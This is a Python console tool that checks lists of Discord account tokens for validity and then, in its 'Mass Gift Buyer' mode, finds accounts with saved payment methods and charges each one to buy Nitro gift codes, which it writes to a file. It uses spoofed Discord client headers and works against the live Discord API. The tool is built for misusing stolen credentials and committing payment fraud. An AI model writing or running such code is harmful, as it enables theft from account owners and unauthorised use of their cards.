import os, logging, asyncio, aiohttp, tasksio, time

magenta = "\x1b[35;1m"
reset = "\x1b[0m"

logging.basicConfig(
     level=logging.INFO,
     format=f"{magenta}[{reset}%(levelname)s/%(asctime)s{magenta}]{reset} %(message)s{reset}",
     datefmt="%H:%M:%S"
)

def headers(token):
    headers = {
        "Authorization": token,
        "accept": "*/*",
        "accept-language": "en-US",
        "connection": "keep-alive",
        "cookie": "__cfduid=%s; __dcfduid=%s; locale=en-US" % (os.urandom(43).hex(), os.urandom(32).hex()),
        "DNT": "1",
        "origin": "https://discord.com",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "referer": "https://discord.com/channels/@me",
        "TE": "Trailers",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9004 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36",
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDA0Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTgzNjIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTE4MjA1LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="
    }
    return headers

class TokenChecker():
    def __init__(self):
        os.system("cls")

        self.tokens = []
        with open("data/token checker/tokens.txt") as file:
            for token in file:
                self.tokens.append(token.strip())

        self.validtokens = []
        self.invalidtokens = []
        self.phonelockedtokens = []

    async def check(self, token):
        async with aiohttp.ClientSession(headers=headers(token)) as client:
            async with client.get("https://discord.com/api/v9/users/@me/settings") as response:
                resp = await response.text()
                if "You need to verify your account in order to perform this action" in resp:
                    logging.info(f"Phone Locked [{magenta}{token[:22]}...{reset}]")
                    self.phonelockedtokens.append(token)
                elif "401: Unauthorized" in resp:
                    logging.info(f"Invalid      [{magenta}{token[:22]}...{reset}]")
                    self.invalidtokens.append(token)
                elif "429: R" in resp:
                    resp2 = await response.json()
                    logging.info(f"Ratelimited  [{magenta}{token[:22]}...{reset}]")
                    logging.info(resp2)
                    logging.info(resp2.get("retry_after"))
                    time.sleep(float(resp2.get("retry_after")))
                    await self.check(token)
                else:
                    logging.info(f"Valid        [{magenta}{token[:22]}...{reset}]")
                    self.validtokens.append(token)

    async def checktokens(self):
        os.system("cls")

        async with tasksio.TaskPool(1000) as pool:
            for token in self.tokens:
                await pool.put(self.check(token))

        logging.info(f"Checked {magenta}{len(self.validtokens) + len(self.invalidtokens) + len(self.phonelockedtokens)}{reset} tokens, {magenta}{len(self.validtokens)}{reset} valid, {magenta}{len(self.invalidtokens)}{reset} invalid, {magenta}{len(self.phonelockedtokens)}{reset} phone locked")


class GiftBuyer():
    def __init__(self):
        os.system("cls")

        self.tokens = []
        with open("data/gift buyer/tokens.txt") as file:
            for token in file:
                self.tokens.append(token.strip())

        self.validtokens = []
        self.invalidtokens = []
        self.phonelockedtokens = []
        self.paymenttokens = []
        self.type = input(f"{reset}Type ({magenta}Classic{reset}, {magenta}Boost{reset}): {magenta}").lower()
        self.duration = input(f"{reset}Duration{reset} ({magenta}Month{reset}, {magenta}Year{reset}): {magenta}")

        if self.type == "classic":
            self.nitro_id = "521846918637420545"

            if self.duration == "month":
                self.sku_id = "511651871736201216"
                self.nitro_price = "499"
            elif self.duration == "year":
                self.sku_id = "511651876987469824"
                self.nitro_price = "4999"
        elif self.type == "booost":
            self.nitro_id = "521847234246082599"

            if self.duration == "month":
                self.sku_id = "511651880837840896"
                self.nitro_price = "999"
            elif self.duration == "year":
                self.sku_id = "511651885459963904"
                self.nitro_price = "9999"



    async def check(self, token):
        async with aiohttp.ClientSession(headers=headers(token)) as client:
            async with client.get("https://discord.com/api/v9/users/@me/settings") as response:
                resp = await response.text()
                if "You need to verify your account in order to perform this action" in resp:
                    logging.info(f"Phone Locked [{magenta}{token[:22]}...{reset}]")
                    self.phonelockedtokens.append(token)
                elif "401: Unauthorized" in resp:
                    logging.info(f"Invalid      [{magenta}{token[:22]}...{reset}]")
                    self.invalidtokens.append(token)
                elif "429: R" in resp:
                    resp2 = await response.json()
                    logging.info(f"Ratelimited  [{magenta}{token[:22]}...{reset}]")
                    logging.info(resp2)
                    logging.info(resp2.get("retry_after"))
                    time.sleep(float(resp2.get("retry_after")))
                    await self.check(token)
                else:
                    logging.info(f"Valid        [{magenta}{token[:22]}...{reset}]")
                    self.validtokens.append(token)

    async def payment(self, token):
        async with aiohttp.ClientSession(headers=headers(token)) as client:
            async with client.get("https://discord.com/api/v9/users/@me/billing/payment-sources") as response:
                resp = await response.json()
                if resp != []:
                    self.paymenttokens.append(token)

    async def checktokens(self):
        os.system("cls")

        async with tasksio.TaskPool(1000) as pool:
            for token in self.tokens:
                await pool.put(self.check(token))

        logging.info(f"Checked {magenta}{len(self.validtokens) + len(self.invalidtokens) + len(self.phonelockedtokens)}{reset} tokens, {magenta}{len(self.validtokens)}{reset} valid, {magenta}{len(self.invalidtokens)}{reset} invalid, {magenta}{len(self.phonelockedtokens)}{reset} phone locked")

    async def checkpayments(self):
        async with tasksio.TaskPool(1000) as pool:
            for token in self.validtokens:
                await pool.put(self.payment(token))

    async def buy(self):
        for token in self.paymenttokens:
            async with aiohttp.ClientSession(headers=headers(token)) as client:
                ids = []
                async with client.get("https://discord.com/api/v9/users/@me/billing/payment-sources") as response:
                    resp = await response.json()
                    if resp != []:
                        for source in resp:
                            try:
                                ids.append(source["id"])
                            except Exception:
                                pass

                if len(ids) != 0:
                    for id in ids:
                        async with client.post(f"https://discord.com/api/v9/store/skus/{self.nitro_id}/purchase", json={"gift":True, "sku_subscription_plan_id": self.sku_id, "payment_source_id": id, "payment_source_token": None, "expected_amount": self.nitro_price, "expected_currency": "usd", "purchase_token": "500fb34b-671a-4614-a72e-9d13becc2e95"}) as response:
                            json = await response.json()
                            if json.get("gift_code"):
                                logging.info(f"Purchased nitro [{magenta}{token[:22]}...{reset}]")
                                with open("data/gift buyer/nitros.txt", "a+") as f:
                                    code = json.get("gift_code")
                                    f.write(f"discord.gift/{code}\n")
                            else:
                                if json.get("message"):
                                    message = json.get("message")
                                    logging.info(f"{message} [{magenta}{token[:22]}...{reset}]")
                                else:
                                    logging.info(f"Failed to buy nitro for some reason. [{magenta}{token[:22]}...{reset}]")


def menu():
    os.system("cls")
    print(f"""
{magenta}1 {reset}-> {magenta}Token Checker (no exports yet)
{magenta}2 {reset}-> {magenta}Mass Gift Buyer
{reset}""")

    try:
        choice = int(input(f"\n\nChoose -> {magenta}"))
    except Exception:
        menu()

    if choice == 1:
        tokenchecker()
    elif choice == 2:
        buygifts()
    else:
        menu()

def buygifts():
    gb = GiftBuyer()
    asyncio.get_event_loop().run_until_complete(gb.checktokens())
    asyncio.get_event_loop().run_until_complete(gb.checkpayments())
    asyncio.get_event_loop().run_until_complete(gb.buy())

    print("\n")
    logging.info("Finished, press any key to return to main menu")
    os.system("pause >NUL")
    menu()

def tokenchecker():
    tc = TokenChecker()
    asyncio.get_event_loop().run_until_complete(tc.checktokens())

    print("\n")
    logging.info("Finished, press any key to return to main menu")
    os.system("pause >NUL")
    menu()

menu()